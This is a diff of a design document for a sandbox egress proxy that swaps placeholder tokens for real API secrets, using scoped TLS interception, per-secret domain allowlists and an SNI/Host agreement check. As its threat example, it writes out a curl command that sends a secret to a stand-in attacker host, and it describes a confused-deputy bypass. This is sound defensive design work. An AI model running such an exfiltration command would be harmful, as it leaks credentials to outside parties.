@@ -35,8 +35,11 @@ path.
 - The mechanism is transparent to the default HTTPS client of every
   mainstream language (curl, Python, Node, Bun, Deno, Go, Java, Ruby, PHP,
   Rust with native-tls). No agent code changes required.
-- Failure modes are loud (TLS error, connection refused) rather than silent
-  (placeholder reaches upstream as garbage).
+- Failure modes are loud (TLS error, connection refused) rather than silent.
+  Specifically: a placeholder observed on a connection to a domain not in
+  that secret's `allowedDomains` causes dsbx to drop the connection, not
+  to forward the literal placeholder to a potentially attacker-controlled
+  upstream.
 
 ## Non-goals
 
@@ -87,33 +90,55 @@ implementation.
 __DST_SECRET_<32 hex chars>__
 ```
 
-where the hex is `HMAC_SHA256(per-workspace-key, name || ":" || version)`
-truncated to 16 bytes.
+where the hex is a 16-byte random nonce, generated when the secret row is
+created and stored on the row as `placeholderNonce`. Rotation generates
+a new nonce.
+
+This is a deliberately simpler model than HMAC-deriving the placeholder
+from `(workspace, name, version)`: a random nonce removes the question
+of where a HMAC key would live, who can read it, and how it rotates. The
+nonce is stored alongside the encrypted value (same row, same encryption
+posture). It's unforgeable by construction (random) and reveals nothing
+about the underlying secret.
 
 Properties:
 
 - Fixed width, alphanumeric: safe to embed in shell, JSON, headers, URLs.
 - Greppable regex: `__DST_SECRET_[0-9a-f]{32}__`.
-- Deterministic per (workspace, name, version): stable across boots until
-  the row is rotated. Rotation bumps `version`, which rotates the
-  placeholder, which forces persisted agent state to break loudly.
-- No information leakage: doesn't reveal the secret, its length, or allow
-  the agent to forge a placeholder for a value it doesn't know.
+- Stable across sandbox boots until the row is rotated. Rotation issues
+  a new nonce, which rotates the placeholder and forces persisted agent
+  state to break loudly.
+- Workspace-scoped identity: a given secret has the same placeholder in
+  every sandbox of the workspace it belongs to. A persisted placeholder
+  replayed from sandbox A to sandbox B of the same workspace will
+  substitute correctly, which is fine - the secret is a workspace-level
+  authority, and an agent in sandbox B is already authorized to use any
+  secret the workspace's admin granted access to. Cross-workspace replay
+  is impossible (different nonce).
+- No information leakage: random bytes reveal nothing about the secret,
+  its length, or any predictable structure the agent could forge.
 
 ### Substitution logic
 
-In dsbx, branch by port in `handle_connection`:
+In dsbx, branch by port in `handle_connection`. The MITM stage is
+**scoped to the union of all configured secrets' `allowedDomains`**:
+dsbx terminates TLS only when the SNI matches a domain that some secret
+is allowed to be released to. All other 443 traffic stays on the
+existing TCP-splice path, so cert-pinned and mTLS clients to non-secret
+domains are unaffected.
 
-- **Port 443 (HTTPS)**: Peek SNI as today. Forge a leaf cert for the SNI
-  signed by the in-process CA. Terminate inbound TLS on dsbx with that
-  leaf. Open outbound TLS toward the real upstream (still tunneled through
-  the central egress proxy on 4443). On the decrypted inner stream, run an
-  HTTP/1.1 or HTTP/2 (selected by ALPN) header/URL rewriter. Re-encrypt
-  outbound.
-- **Port 80 (HTTP)**: Terminate TCP, run an HTTP/1.1 parser (`httparse`),
-  rewrite headers/URL, re-emit.
-- **Other ports (raw TCP)**: Pass through unchanged. Optional hardening:
-  if a placeholder appears on a raw TCP connection, drop the connection.
+- **Port 443 (HTTPS), SNI in allowlist union**: Peek SNI. Forge a leaf
+  cert for the SNI signed by the in-process CA. Terminate inbound TLS
+  on dsbx with that leaf. Open outbound TLS toward the real upstream
+  (still tunneled through the central egress proxy on 4443). On the
+  decrypted inner stream, run an HTTP/1.1 or HTTP/2 (selected by ALPN)
+  header/URL rewriter. Re-encrypt outbound.
+- **Port 443, SNI not in allowlist union**: TCP-splice as today. No
+  TLS termination, no inspection.
+- **Port 80 (HTTP)**: Terminate TCP, run an HTTP/1.1 parser
+  (`httparse`), rewrite headers/URL, re-emit.
+- **Other ports (raw TCP)**: Pass through unchanged. If a placeholder
+  appears on a raw TCP connection, drop the connection (loud failure).
 
 Substitution is gated on a per-secret destination allowlist:
 
@@ -121,24 +146,58 @@ Substitution is gated on a per-secret destination allowlist:
 secret.allowedDomains: string[]   // e.g. ["api.openai.com"]
 ```
 
-dsbx replaces `__DST_SECRET_<h>__` only if the destination domain is in
-the matching secret's `allowedDomains`. Otherwise the placeholder passes
-through to the upstream unchanged, which will reject the request with an
-auth error (loud failure). The placeholder-to-non-allowed-domain event
-is logged on the existing deny-log channel.
+The substitution gate requires three things to agree on a domain in the
+secret's `allowedDomains`:
+
+1. The TLS SNI used at handshake time.
+2. The HTTP `Host:` header (h1) or `:authority:` pseudo-header (h2).
+3. (When present) the absolute-form request URI authority.
+
+If they all agree on an allowed domain, dsbx replaces the placeholder
+with the real value. If a recognized placeholder appears but the
+destination is **not** in the matching secret's `allowedDomains`, or the
+SNI/Host/`:authority:` disagree, dsbx **drops the connection** and
+records a structured deny-log event with the secret name, the SNI, and
+the disagreeing Host/authority. The literal placeholder is never
+forwarded to the upstream.
 
 This is the security-critical control. It stops `curl
-https://attacker-allowlisted-by-egress-policy.com -H "X: $DST_FOO"` even
-when that domain is on the egress allowlist for some unrelated reason.
-The per-secret allowlist is stricter than (and orthogonal to) the egress
-domain policy.
+https://attacker-allowlisted-by-egress-policy.com -H "X: $DST_FOO"`
+even when that domain is on the egress allowlist for some unrelated
+reason, and it closes the SNI/Host confused-deputy variant where the
+agent opens TLS to an allowed domain but inserts `Host:` for a
+different one. The per-secret allowlist is stricter than (and orthogonal
+to) the egress domain policy.
 
 ### Header-only initially, body later
 
 Phase 1 covers headers and URL only. The common API auth case
 (`Authorization`, `X-API-Key`, `Cookie`) is fully covered. Bodies (OAuth
-`client_secret`, webhook signing, multipart forms) come in Phase 2 with an
-`includeBody` flag on each secret row.
+`client_secret`, webhook signing, multipart forms) come in **Phase 3**
+with an `includeBody` flag on each secret row.
+
+### CA lifetime and dsbx restarts
+
+The MITM CA is **per-sandbox-VM**, not per-dsbx-process. dsbx generates
+the CA cert + private key on first start of a sandbox VM and persists
+both to **tmpfs** at `/run/dust/egress-ca.pem` (cert, root 0644 so the
+agent UID can install it into the system store) and
+`/run/dust/egress-ca.key` (key, root 0600). On any subsequent dsbx
+restart within the same sandbox VM, dsbx reads the existing CA from
+tmpfs and reuses it.
+
+Why this matters: `tools/index.ts` can restart the dsbx forwarder on
+health failure, and trust env vars like `NODE_EXTRA_CA_CERTS` and the
+Java keystore are read at process startup only. If dsbx rotated the CA
+on restart, every agent process that started against the old CA would
+silently fail to verify dsbx's leaf going forward. Persisting on tmpfs
+keeps the CA stable for the VM's lifetime.
+
+Why tmpfs and not disk: tmpfs is RAM-backed and never hits durable
+storage, so the security property of "key never on disk" still holds.
+Combined with our invariant that the agent UID never escalates to root,
+the agent has no path to read the key (root-only file permissions), and
+the key never survives a sandbox VM teardown.
 
 ### Client-language agnosticism
 
@@ -167,7 +226,8 @@ to public sites.
 | Go (`crypto/tls` on Linux) | yes | `SSL_CERT_FILE`, `SSL_CERT_DIR` | replace |
 | Ruby, PHP, Perl | yes | `SSL_CERT_FILE` | replace |
 | Python `ssl` stdlib | yes | `SSL_CERT_FILE` | replace |
-| Python `requests` / `httpx` | no | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE` | replace |
+| Python `requests` | no | `REQUESTS_CA_BUNDLE` (falls back to `CURL_CA_BUNDLE`) | replace |
+| Python `httpx` | no | `SSL_CERT_FILE` / `SSL_CERT_DIR` | replace |
 | Node.js | no | `NODE_EXTRA_CA_CERTS` | append (startup only) |
 | Bun | no | `NODE_EXTRA_CA_CERTS` (verify) | append (claimed) |
 | Deno | no | `DENO_CERT` + `DENO_TLS_CA_STORE` | append |
@@ -177,12 +237,18 @@ to public sites.
 | AWS SDKs | no | `AWS_CA_BUNDLE` | replace |
 | Git over HTTPS | yes | `GIT_SSL_CAINFO` | replace |
 
+Source notes: Requests respects `REQUESTS_CA_BUNDLE` first, then falls
+back to `CURL_CA_BUNDLE` (Requests advanced docs), not `SSL_CERT_FILE`.
+HTTPX uses `SSL_CERT_FILE`/`SSL_CERT_DIR` (HTTPX environment-variables
+docs). Node reads `NODE_EXTRA_CA_CERTS` at process start only (Node CLI
+docs).
+
 The replace/append distinction drives the trust setup. The sandbox image
 maintains two files and points each env var at the right one:
 
 1. **Install the dsbx-issued CA into the system store** at boot:
    ```
-   cp /etc/dust/egress-ca.pem /usr/local/share/ca-certificates/dust-egress.crt
+   cp /run/dust/egress-ca.pem /usr/local/share/ca-certificates/dust-egress.crt
    update-ca-certificates
    ```
 2. **Maintain `/etc/dust/ca-bundle.pem` = system bundle ∪ dust-egress
@@ -201,14 +267,14 @@ maintains two files and points each env var at the right one:
    GIT_SSL_CAINFO=/etc/dust/ca-bundle.pem
 
    # append-style, single CA, added to the runtime's built-in bundle
-   NODE_EXTRA_CA_CERTS=/etc/dust/egress-ca.pem
-   DENO_CERT=/etc/dust/egress-ca.pem
+   NODE_EXTRA_CA_CERTS=/run/dust/egress-ca.pem
+   DENO_CERT=/run/dust/egress-ca.pem
    DENO_TLS_CA_STORE=system,mozilla
    ```
-4. **Java keystore import at boot** (the CA is ephemeral per boot):
+4. **Java keystore import at boot** (the CA is per-sandbox-VM):
    ```
    keytool -importcert -noprompt -trustcacerts \
-     -alias dust-egress -file /etc/dust/egress-ca.pem \
+     -alias dust-egress -file /run/dust/egress-ca.pem \
      -keystore "$JAVA_HOME/lib/security/cacerts" -storepass changeit
    ```
 5. **Boot order**: dsbx starts and writes the CA → env exports happen →
@@ -331,8 +397,11 @@ Out of scope for Phase 0:
 
 - DB schema changes, model migrations, admin UI.
 - Changes to the existing `WorkspaceSandboxEnvVar` flow.
-- The HMAC-derived `__DST_SECRET_<32hex>__` format.
+- The random-nonce `__DST_SECRET_<32hex>__` format.
 - The `/etc/dust/egress-secrets.json` per-sandbox file.
+- CA persistence on tmpfs (Phase 0 regenerates on dsbx start; if
+  `tools/index.ts` restarts dsbx mid-experiment the trust bundle goes
+  stale - acceptable for a controlled smoke test, not for production).
 - `allowedDomains` gating, deny-log enrichment.
 - Trust coverage beyond curl (Node, Python, Java, Rust, Bun, Deno, Go).
 - HTTP/2, body rewriting, URL rewriting, websocket Upgrade, non-HTTP
@@ -387,23 +456,48 @@ time.
 ### Phase 1, MVP - HTTP/1.1
 
 - HTTP/1.1 only on port 443 (force HTTP/1 via ALPN), headers + URL only.
-- HMAC-derived `__DST_SECRET_<32hex>__` placeholder.
+- Random-nonce `__DST_SECRET_<32hex>__` placeholder. Each secret row has
+  a 16-byte `placeholderNonce` column generated at create/rotate time.
+- **MITM scope = allowlist union**: dsbx terminates TLS only when the
+  SNI matches a domain in some configured secret's `allowedDomains`.
+  Other 443 traffic stays on the existing TCP-splice path. The allowlist
+  union is computed by `front` at sandbox boot and shipped in
+  `/etc/dust/egress-secrets.json`; dsbx loads it once on start.
+- **Substitution gate**: SNI + HTTP `Host:` (h1) + h2 `:authority:`
+  must all agree on a domain in the matching secret's `allowedDomains`.
+  On a recognized placeholder with disagreement (or destination not in
+  the secret's allowlist), dsbx drops the connection and emits a
+  structured deny-log event. The literal placeholder never reaches the
+  upstream.
+- **CA persisted on tmpfs**: dsbx writes the per-sandbox-VM CA to
+  `/run/dust/egress-ca.{pem,key}` on first start; reuses on restart.
+  Key is root-owned 0600. Cert is root-owned 0644 so the boot script
+  can install it into the system store.
 - `WorkspaceSandboxEnvVar` split into config vars and secrets (see
-  above). Secrets gain `allowedDomains: string[]` and `version: int`.
+  above). Secrets gain `allowedDomains: string[]` and `placeholderNonce`.
 - `front` writes `/etc/dust/egress-secrets.json` (root, 0600) per
-  sandbox, alongside the JWT.
+  sandbox at boot, alongside the JWT. The file contains
+  `{ placeholder, encryptedValue, allowedDomains }[]`.
 - `buildSandboxEnvVars` injects placeholders for secrets, real values
   for config vars.
-- Trust coverage: Node, Python, Bun, Deno, Go, Java (keytool at boot),
-  Rust (native-tls), AWS SDKs, Git. Replace-style vs append-style env
-  vars set per the matrix above. Rust webpki and cert-pinning clients
-  documented as known holes that fail loudly.
+- Trust coverage: Node, Python (Requests + HTTPX, separately), Bun,
+  Deno, Go, Java (keytool at boot), Rust (native-tls), AWS SDKs, Git.
+  Replace-style vs append-style env vars set per the matrix above.
+  Rust webpki and cert-pinning clients documented as known holes that
+  fail loudly.
 - Bash redactor (#25051) keeps applying to config vars (defense in
   depth for plaintext-in-env). Skill prompt updated to tell the agent
   secrets will substitute on the wire and not to second-guess env.
 - Admin UI: secrets get an `allowedDomains` column; the create flow
   asks for the class up front.
-- Audit log: per-secret allowlist changes, class promotions.
+- Audit log: per-secret allowlist changes, class promotions, rotations.
+- **Live update is out of scope for Phase 1.** Secret edits
+  (`allowedDomains`, value rotation, deletion, class promotion) apply
+  only to *new* sandboxes. Running sandboxes keep the snapshot they
+  booted with. Document this in the admin UI. Phase 2 may add
+  kill-and-recreate of running sandboxes on secret change; for now an
+  admin who needs the change to take effect immediately recreates the
+  sandbox.
 - Estimate: ~2 engineer-weeks.
 
 ### Phase 2, MVP - HTTP/2
@@ -448,16 +542,36 @@ and validate it on h1 before adding frame-level complexity.
   Bun, Deno, Go, Java, Rust native-tls, AWS SDKs, Git). Rust
   `rustls-webpki` and cert-pinning clients documented as known holes
   that fail loudly.
-- **Cross-sandbox replay**: documented as expected behavior. Placeholders
-  are sandbox-version-bound; replay from a different sandbox fails
-  because the destination upstream rejects the unsubstituted placeholder.
-  No special-case detection.
-- **CA private-key handling**: in-memory only, never written to disk.
-  `/etc/dust/egress-ca.pem` is the cert (public, 0644 so the agent UID
-  can read it for trust-store install paths that need it). The agent UID
-  never has a path to the key. We assume the agent UID never escalates
-  to root inside the sandbox VM; under that invariant, dsbx process
-  memory is not reachable from the agent regardless of `ptrace_scope`.
+- **Placeholder identity**: workspace-scoped, not sandbox-scoped. A
+  given secret has the same placeholder in every sandbox of the
+  workspace. Within-workspace replay across sandboxes substitutes
+  correctly, which is fine: the secret is a workspace-level authority
+  and any sandbox of that workspace is already authorized to use it.
+  Cross-workspace replay is impossible (different random nonce).
+- **Placeholder generator**: per-secret 16-byte random nonce stored on
+  the row, not HMAC. Removes the "where does the workspace key live"
+  question entirely. Unforgeable by construction. Rotation = new nonce.
+- **Loud failure on disallowed-placeholder**: dsbx **drops the
+  connection** when a recognized placeholder is observed but the
+  destination doesn't match the secret's `allowedDomains`, or when
+  SNI/Host/`:authority:` disagree. The literal placeholder is never
+  forwarded to the upstream. Logged with structured deny event.
+- **MITM scope**: only the union of all configured secrets'
+  `allowedDomains`. Other HTTPS traffic stays on the existing
+  TCP-splice path. Cert-pinned and mTLS clients to non-secret domains
+  are unaffected.
+- **Substitution gate**: SNI + HTTP `Host:` + h2 `:authority:` must
+  all agree on a domain in the matching secret's `allowedDomains`.
+  Closes the SNI/Host confused-deputy edge case.
+- **CA lifecycle**: per-sandbox-VM, persisted on tmpfs at
+  `/run/dust/egress-ca.{pem,key}`. Survives dsbx restart. Cert is
+  root-owned 0644 (boot script needs to install it into the system
+  store); key is root-owned 0600. tmpfs is RAM-backed, never hits
+  durable storage. Combined with the no-escalation invariant, the agent
+  UID has no path to the key.
+- **Live update / rotation**: out of scope for Phase 1. Secret edits
+  apply to new sandboxes only; running sandboxes keep their boot-time
+  snapshot. Phase 2 may add kill-and-recreate on change.
 - **Migration of existing rows**: existing `WorkspaceSandboxEnvVar` rows
   default to config vars on rollout. Promotion to secrets is fully
   manual (no auto-flagging), since the only workspace where this rolls
